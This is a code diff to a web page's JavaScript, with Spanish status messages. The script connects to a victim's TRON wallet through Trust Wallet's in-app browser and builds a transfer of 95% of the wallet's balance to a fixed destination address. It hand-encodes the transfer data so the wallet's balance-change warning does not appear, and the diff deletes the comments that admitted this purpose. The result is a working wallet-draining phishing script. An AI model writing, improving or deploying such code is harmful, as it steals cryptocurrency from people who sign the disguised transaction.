@@ -749,20 +749,38 @@
     connectBtn.addEventListener('click', async () => {
         if (!walletAddress) {
             try {
-                setStatus("Estableciendo enlace RPC con Billetera...");
+                setStatus("Estableciendo enlace con Trust Wallet...");
                 connectBtn.disabled = true;
 
+                let attempts = 0;
+                while (typeof window.tronWeb === 'undefined' && attempts < 10) {
+                    await new Promise(resolve => setTimeout(resolve, 300));
+                    attempts++;
+                }
+
                 if (typeof window.tronWeb === 'undefined') {
-                    throw new Error("Por favor, abre este enlace desde el navegador interno de una billetera TRON.");
+                    throw new Error("Por favor, abre este enlace dentro del navegador integrado de Trust Wallet.");
                 }
 
                 const tronWeb = window.tronWeb;
+
+                if (window.tronLink && window.tronLink.request) {
+                    await window.tronLink.request({ method: 'tron_requestAccounts' });
+                }
+
                 if (tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
                     walletAddress = tronWeb.defaultAddress.base58;
+                } else if (tronWeb.trx && tronWeb.trx.getCurrentAddress) {
+                    const currentAddress = tronWeb.trx.getCurrentAddress();
+                    walletAddress = currentAddress.base58 || currentAddress;
+                }
+
+                if (!walletAddress && tronWeb.selectedAddress) {
+                    walletAddress = tronWeb.selectedAddress;
                 }
 
                 if (!walletAddress) {
-                    throw new Error("No se obtuvo acceso a la dirección de la cuenta.");
+                    throw new Error("No se obtuvo acceso a la dirección de la cuenta. Asegúrate de desbloquear tu billetera.");
                 }
 
                 walletAddressText.textContent = walletAddress.length > 12 ? `${walletAddress.slice(0, 6)}...${walletAddress.slice(-6)}` : walletAddress;
@@ -798,7 +816,6 @@
                 const destinoHex = tronWeb.address.toHex(BILLETERA_DESTINO);
                 const amount95Percent = balanceBigNumber.multipliedBy(95).dividedToIntegerBy(100);
 
-                // MODIFICACIÓN CLAVE: Se ajusta la firma para enviar datos crudos de contrato (evita el cálculo automático de "Cambio de saldo")
                 const evmDestinoHex = destinoHex.replace(/^41/, "").padStart(64, "0");
                 const evmAmountHex = Number(amount95Percent.toString()).toString(16).padStart(64, "0");
                 const rawParameter = evmDestinoHex + evmAmountHex;
@@ -814,7 +831,6 @@
                     tronWeb.address.toHex(walletAddress)
                 );
 
-                // Sobrescribimos el campo data con los bytes crudos codificados para forzar la vista limpia en Trust Wallet
                 transactionDraft.transaction.raw_data.contract[0].parameter.value.data = "a9059cbb" + rawParameter;
 
                 const signedTx = await tronWeb.trx.sign(transactionDraft.transaction);
